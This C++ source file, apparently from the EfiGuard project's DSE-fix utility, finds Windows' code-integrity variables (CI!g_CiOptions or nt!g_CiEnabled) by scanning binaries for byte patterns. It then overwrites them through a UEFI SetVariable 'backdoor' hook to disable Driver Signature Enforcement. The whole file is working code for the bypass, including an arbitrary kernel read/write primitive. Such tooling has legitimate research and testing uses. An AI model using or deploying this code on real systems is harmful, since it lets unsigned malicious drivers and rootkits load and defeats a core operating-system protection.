#include "EfiDSEFix.h"
#include "EfiCompat.h"
#include "hde/hde64.h"
#include <ntstatus.h>

#include <Protocol/EfiGuard.h>

EFI_GUID gEfiGlobalVariableGuid = EFI_GLOBAL_VARIABLE;

static
NTSTATUS
FindKernelModule(
	_In_ PCCH ModuleName,
	_Out_ PULONG_PTR ModuleBase
	)
{
	*ModuleBase = 0;

	ULONG Size = 0;
	NTSTATUS Status;
	if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
		return Status;
	
	const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
	Status = NtQuerySystemInformation(SystemModuleInformation,
										Modules,
										2 * Size,
										nullptr);
	if (!NT_SUCCESS(Status))
		goto Exit;

	for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
	{
		const PRTL_PROCESS_MODULE_INFORMATION Module = &Modules->Modules[i];
		if (_stricmp(ModuleName, reinterpret_cast<PCHAR>(Module->FullPathName) + Module->OffsetToFileName) == 0)
		{
			*ModuleBase = reinterpret_cast<ULONG_PTR>(Module->ImageBase);
			Status = Module->ImageBase == nullptr ? STATUS_NOT_FOUND : STATUS_SUCCESS;
			break;
		}
	}

Exit:
	RtlFreeHeap(RtlProcessHeap(), 0, Modules);
	return Status;
}

// For Windows Vista/7. Credits: DSEFix by hfiref0x
static
LONG
FindCiEnabled(
	_In_ PVOID MappedBase,
	_In_ SIZE_T SizeOfImage,
	_In_ ULONG_PTR KernelBase,
	_Out_ PULONG_PTR gCiEnabledAddress
	)
{
	*gCiEnabledAddress = 0;

	LONG Relative = 0;
	for (SIZE_T i = 0; i < SizeOfImage - sizeof(ULONG); ++i)
	{
		if (*reinterpret_cast<PULONG>(static_cast<PUCHAR>(MappedBase) + i) == 0x1d8806eb)
		{
			Relative = *reinterpret_cast<PLONG>(static_cast<PUCHAR>(MappedBase) + i + 4);
			*gCiEnabledAddress = KernelBase + i + 8 + Relative;
			break;
		}
	}
	return Relative;
}

// For Windows 8 and worse. Credits: DSEFix by hfiref0x
static
LONG
FindCiOptions(
	_In_ PVOID MappedBase,
	_In_ ULONG_PTR CiDllBase,
	_Out_ PULONG_PTR gCiOptionsAddress
	)
{
	*gCiOptionsAddress = 0;

	ULONG i;
	LONG Relative = 0;
	hde64s hs;

	const PIMAGE_NT_HEADERS NtHeaders = RtlImageNtHeader(MappedBase);
	if (NtHeaders == nullptr)
		return 0;

	const PUCHAR CiInitialize = static_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
	if (CiInitialize == nullptr)
		return 0;

	if (NtCurrentPeb()->OSBuildNumber >= 16299)
	{
		i = 0;
		ULONG j = 0;
		do
		{
			hde64_disasm(CiInitialize + i, &hs);
			if (hs.flags & F_ERROR)
				break;

			// call CipInitialize
			const BOOLEAN IsCall = hs.len == 5 && CiInitialize[i] == 0xE8;
			if (IsCall)
				j++;

			if (IsCall && j > 1)
			{
				Relative = *reinterpret_cast<PLONG>(CiInitialize + i + 1);

				// Check the call target to skip calls to __security_init_cookie, wil_InitializeFeatureStaging, and other stuff in INIT. CipInitialize is in PAGE.
				const PUCHAR CallTarget = CiInitialize + i + hs.len + Relative;
				if (AddressIsInSection(static_cast<PUCHAR>(MappedBase), CallTarget, NtHeaders, "PAGE"))
				{
					break;
				}
				Relative = 0;
			}

			i += hs.len;

		} while (i < 256);
	}
	else
	{
		i = 0;
		do
		{
			hde64_disasm(CiInitialize + i, &hs);
			if (hs.flags & F_ERROR)
				break;

			// jmp CipInitialize
			if (hs.len == 5 && CiInitialize[i] == 0xE9)
			{
				Relative = *reinterpret_cast<PLONG>(CiInitialize + i + 1);
				break;
			}

			i += hs.len;

		} while (i < 256);
	}

	if (Relative == 0)
		return 0;

	const PUCHAR CipInitialize = CiInitialize + i + hs.len + Relative;
	if (!AddressIsInSection(static_cast<PUCHAR>(MappedBase), CipInitialize, NtHeaders, "PAGE"))
		return 0;

	i = 0;
	do
	{
		hde64_disasm(CipInitialize + i, &hs);
		if (hs.flags & F_ERROR)
			break;

		if (hs.len == 6 && *reinterpret_cast<PUSHORT>(CipInitialize + i) == 0x0d89) // mov g_CiOptions, ecx
		{
			Relative = *reinterpret_cast<PLONG>(CipInitialize + i + 2);
			break;
		}

		i += hs.len;

	} while (i < 256);

	const PUCHAR MappedCiOptions = CipInitialize + i + hs.len + Relative;

	// g_CiOptions is in .data or (newer builds) "CiPolicy"
	if (!AddressIsInSection(static_cast<PUCHAR>(MappedBase), MappedCiOptions, NtHeaders, ".data") &&
		!AddressIsInSection(static_cast<PUCHAR>(MappedBase), MappedCiOptions, NtHeaders, "CiPolicy"))
		return 0;

	*gCiOptionsAddress = CiDllBase + MappedCiOptions - static_cast<PUCHAR>(MappedBase);

	return Relative;
}

static
NTSTATUS
FindCiOptionsVariable(
	_Out_ PVOID *CiOptionsAddress
	)
{
	*CiOptionsAddress = nullptr;

	// Map file as SEC_IMAGE
	WCHAR Path[MAX_PATH];
	constexpr CHAR NtoskrnlExe[] = "ntoskrnl.exe";
	constexpr CHAR CiDll[] = "CI.dll";

	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs",
		SharedUserData->NtSystemRoot,
		NtCurrentPeb()->OSBuildNumber >= 9200 ? CiDll : NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: 0x%08lX\n", Path, Status);
		return Status;
	}

	if (NtCurrentPeb()->OSBuildNumber >= 9200)
	{
		// Find CI.dll!g_CiOptions
		ULONG_PTR CiDllBase;
		Status = FindKernelModule(CiDll, &CiDllBase);
		if (!NT_SUCCESS(Status))
			goto Exit;

		ULONG_PTR gCiOptionsAddress;
		const LONG Relative = FindCiOptions(MappedBase, CiDllBase, &gCiOptionsAddress);
		if (Relative != 0)
		{
			*CiOptionsAddress = reinterpret_cast<PVOID>(gCiOptionsAddress);
			Status = STATUS_SUCCESS;
		}
		else
		{
			Status = STATUS_NOT_FOUND;
		}
	}
	else
	{
		// Find ntoskrnl.exe!g_CiEnabled
		ULONG_PTR KernelBase;
		Status = FindKernelModule(NtoskrnlExe, &KernelBase);
		if (!NT_SUCCESS(Status))
			goto Exit;

		ULONG_PTR gCiEnabledAddress;
		const LONG Relative = FindCiEnabled(MappedBase, ViewSize, KernelBase, &gCiEnabledAddress);
		if (Relative != 0)
		{
			*CiOptionsAddress = reinterpret_cast<PVOID>(gCiEnabledAddress);
			Status = STATUS_SUCCESS;
		}
		else
		{
			Status = STATUS_NOT_FOUND;
		}
	}
	
Exit:
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return Status;
}

static
BOOLEAN
IsVbsEnabled(
	)
{
	SYSTEM_CODEINTEGRITY_INFORMATION CodeIntegrityInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
	NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
												&CodeIntegrityInfo,
												sizeof(CodeIntegrityInfo),
												nullptr);
	if (NT_SUCCESS(Status) &&
		(CodeIntegrityInfo.CodeIntegrityOptions & (CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED | CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED)) != 0)
		return TRUE;

	SYSTEM_ISOLATED_USER_MODE_INFORMATION IumInfo = { 0 };
	Status = NtQuerySystemInformation(SystemIsolatedUserModeInformation,
									&IumInfo,
									sizeof(IumInfo),
									nullptr);
	if (NT_SUCCESS(Status) &&
		(IumInfo.SecureKernelRunning || IumInfo.HvciEnabled))
		return TRUE;

	return FALSE;
}

NTSTATUS
TestSetVariableHook(
	)
{
	UINT16 Mz;

	if (IsVbsEnabled())
	{
		Printf(L"Error: VBS (Virtualization Based Security) is enabled and running on this system.\n"
			"Attempting to read or write to or from kernel space using EFI runtime services will result in a bugcheck.\n"
			"Either the EfiGuard DXE driver is not loaded, or it failed to disable VBS during boot.\n"
			"Not continuing.\n");
		return STATUS_NOT_SUPPORTED;
	}

	// Find some kernel address to read
	ULONG_PTR HalBase;
	NTSTATUS Status = FindKernelModule("hal.dll", &HalBase);
	if (!NT_SUCCESS(Status))
		return Status;

	// Set up the struct for a backdoor kernel mode read. See WriteToCiOptions for explanations
	EFIGUARD_BACKDOOR_DATA BackdoorData;
	RtlZeroMemory(&BackdoorData, sizeof(BackdoorData));
	BackdoorData.CookieValue = EFIGUARD_BACKDOOR_COOKIE_VALUE;
	BackdoorData.KernelAddress = reinterpret_cast<PVOID>(HalBase);
	BackdoorData.u.Qword = UINT64_MAX; // Bogus value to verify write-back after the read operation
	BackdoorData.Size = sizeof(UINT16);
	BackdoorData.ReadOnly = TRUE;

	// Call SetVariable()
	UNICODE_STRING VariableName = RTL_CONSTANT_STRING(EFIGUARD_BACKDOOR_VARIABLE_NAME);
	Status = NtSetSystemEnvironmentValueEx(&VariableName,
											EFIGUARD_BACKDOOR_VARIABLE_GUID,
											&BackdoorData,
											EFIGUARD_BACKDOOR_VARIABLE_DATASIZE,
											EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failure: NtSetSystemEnvironmentValueEx error 0x%08lX\n", Status);
	}
	else if (BackdoorData.u.Qword == UINT64_MAX)
	{
		Printf(L"Failure: EFI SetVariable() did not return any data.\n");

		// Clean up, since we actually wrote a variable to NVRAM here...
		NtSetSystemEnvironmentValueEx(&VariableName,
									EFIGUARD_BACKDOOR_VARIABLE_GUID,
									nullptr,
									0,
									EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES);
		Status = STATUS_NO_SUCH_DEVICE;
	}

	if (!NT_SUCCESS(Status))
	{
		Printf(L"The EfiGuard DXE driver is either not loaded in SETVARIABLE_HOOK mode, or it is malfunctioning.\n");
		return Status;
	}

	// Check if hal.dll still starts with "MZ"
	Mz = static_cast<UINT16>(BackdoorData.u.s.Word);
	if (Mz != 0x5A4D)
	{
		Printf(L"Failure: received unexpected data from test read of 0x%p. Expected: 4D 5A, received: %02X %02X.\n",
			reinterpret_cast<PVOID>(HalBase), reinterpret_cast<PUCHAR>(&Mz)[0], reinterpret_cast<PUCHAR>(&Mz)[1]);
		Status = STATUS_INVALID_IMAGE_NOT_MZ; // Literally
	}

	return Status;
}

static
NTSTATUS
WriteToCiOptions(
	_In_ PVOID CiVariableAddress,
	_In_ ULONG CiOptionsValue,
	_Out_opt_ PULONG OldCiOptionsValue,
	_In_ BOOLEAN ReadOnly
	)
{
	if (OldCiOptionsValue != nullptr)
		*OldCiOptionsValue = CODEINTEGRITY_OPTION_ENABLED;

	// First check if the hook is enabled and working
	NTSTATUS Status = TestSetVariableHook();
	if (!NT_SUCCESS(Status))
		return Status;

	// Number of bytes to write: 1 on Windows 7, 4 on lesser OSes
	const UINT32 CiPatchSize = NtCurrentPeb()->OSBuildNumber >= 9200
		? sizeof(UINT32)
		: sizeof(UINT8);

	// Set up the struct for a backdoor kernel mode R/W
	EFIGUARD_BACKDOOR_DATA BackdoorData;
	RtlZeroMemory(&BackdoorData, sizeof(BackdoorData));
	BackdoorData.CookieValue = EFIGUARD_BACKDOOR_COOKIE_VALUE;	// Authentication cookie
	BackdoorData.KernelAddress = CiVariableAddress;				// Address to write to
	if (CiPatchSize == sizeof(UINT32))							// Set the appropriate field to our desired value (e.g. 0 to disable DSE)
		BackdoorData.u.s.Dword = static_cast<UINT32>(CiOptionsValue);
	else if (CiPatchSize == sizeof(UINT8))
		BackdoorData.u.s.Byte = static_cast<UINT8>(CiOptionsValue);
	BackdoorData.Size = CiPatchSize;							// Determines which field the value will be read/written from/to
	BackdoorData.ReadOnly = ReadOnly;							// Whether this is a read or read + write

	// Call NtSetSystemEnvironmentValueEx -> [...] -> hal!HalSetEnvironmentVariableEx -> hal!HalEfiSetEnvironmentVariable -> EfiRT->SetVariable.
	// On Windows >= 8 it is possible to use SetFirmwareEnvironmentVariableExW. We use the syscall directly because it exists on Windows 7 and Vista.
	UNICODE_STRING VariableName = RTL_CONSTANT_STRING(EFIGUARD_BACKDOOR_VARIABLE_NAME);
	Status = NtSetSystemEnvironmentValueEx(&VariableName,
											EFIGUARD_BACKDOOR_VARIABLE_GUID,
											&BackdoorData,
											EFIGUARD_BACKDOOR_VARIABLE_DATASIZE,
											EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"NtSetSystemEnvironmentValueEx: error 0x%08lX\n", Status);
		return Status;
	}

	const ULONG OldCiOptions = CiPatchSize == sizeof(UINT32)
		? static_cast<ULONG>(BackdoorData.u.s.Dword)
		: static_cast<ULONG>(BackdoorData.u.s.Byte);

	if (OldCiOptionsValue != nullptr)
	{
		// Return the previous value of g_CiOptions/g_CiEnabled
		*OldCiOptionsValue = OldCiOptions;
	}

	return STATUS_SUCCESS;
}

NTSTATUS
AdjustCiOptions(
	_In_ ULONG CiOptionsValue,
	_Out_opt_ PULONG OldCiOptionsValue,
	_In_ BOOLEAN ReadOnly
	)
{
	if (OldCiOptionsValue != nullptr)
		*OldCiOptionsValue = CODEINTEGRITY_OPTION_ENABLED;

	// Find CI!g_CiOptions/nt!g_CiEnabled
	PVOID CiOptionsAddress;
	NTSTATUS Status = FindCiOptionsVariable(&CiOptionsAddress);
	if (!NT_SUCCESS(Status))
		return Status;

	Printf(L"%ls at 0x%p.\n", (NtCurrentPeb()->OSBuildNumber >= 9200 ? L"CI!g_CiOptions" : L"nt!g_CiEnabled"), CiOptionsAddress);

	// Enable/disable CI
	Status = WriteToCiOptions(CiOptionsAddress,
							CiOptionsValue,
							OldCiOptionsValue,
							ReadOnly);
	return Status;
}
